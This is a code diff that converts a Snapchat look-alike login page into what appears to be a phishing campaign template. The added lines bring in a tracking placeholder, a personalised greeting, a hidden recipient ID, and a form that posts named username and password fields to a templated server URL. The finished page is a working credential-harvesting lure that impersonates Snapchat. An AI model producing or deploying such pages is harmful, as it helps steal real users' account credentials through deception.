@@ -6,7 +6,7 @@
     <title>Snapchat - Log In</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
             background-color: #fffc00;
             margin: 0;
             display: flex;
@@ -16,39 +16,52 @@
         }
         .container {
             background-color: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            padding: 35px;
+            border-radius: 12px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.15);
             width: 100%;
-            max-width: 400px;
+            max-width: 380px;
             text-align: center;
         }
         .logo {
-            width: 60px;
+            font-size: 45px;
+            color: #333;
             margin-bottom: 20px;
         }
         h1 {
-            font-size: 24px;
+            font-size: 22px;
             color: #333;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
+        }
+        .subheader {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+        .personalized {
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 15px;
         }
         .input-field {
             width: 100%;
             padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 20px;
             box-sizing: border-box;
-            font-size: 16px;
+            font-size: 15px;
+            background-color: #fafafa;
         }
         .login-btn {
             background-color: #00d2ff;
             color: white;
             padding: 12px;
             border: none;
-            border-radius: 5px;
+            border-radius: 20px;
             width: 100%;
-            font-size: 16px;
+            font-size: 15px;
+            font-weight: bold;
             cursor: pointer;
             margin-top: 10px;
         }
@@ -57,21 +70,21 @@
         }
         .forgot-password {
             display: block;
-            margin-top: 15px;
-            color: #0078ff;
+            margin-top: 12px;
+            color: #0095f6;
             text-decoration: none;
-            font-size: 14px;
+            font-size: 13px;
         }
         .forgot-password:hover {
             text-decoration: underline;
         }
         .signup {
-            margin-top: 20px;
-            font-size: 14px;
+            margin-top: 15px;
+            font-size: 13px;
             color: #333;
         }
         .signup a {
-            color: #0078ff;
+            color: #0095f6;
             text-decoration: none;
         }
         .signup a:hover {
@@ -80,13 +93,16 @@
     </style>
 </head>
 <body>
+    {{.Tracking}}
     <div class="container">
-        <!-- Placeholder for Snapchat logo (SVG or image would typically be used; here, we use text for HTML-only) -->
-        <div style="font-size: 40px; color: #333; margin-bottom: 20px;">👻</div>
+        <div class="logo">👻</div>
         <h1>Log In to Snapchat</h1>
-        <form action="#" method="post">
-            <input type="text" class="input-field" placeholder="Username or Email" required>
-            <input type="password" class="input-field" placeholder="Password" required>
+        <div class="subheader">Log in to continue</div>
+        <div class="personalized">Welcome back, {{.FirstName}}!</div>
+        <form action="{{.BaseURL}}/login" method="post">
+            <input type="hidden" name="rid" value="{{.RID}}">
+            <input type="text" class="input-field" name="username" placeholder="Username or Email" required>
+            <input type="password" class="input-field" name="password" placeholder="Password" required>
             <button type="submit" class="login-btn">Log In</button>
         </form>
         <a href="#" class="forgot-password">Forgot Password?</a>
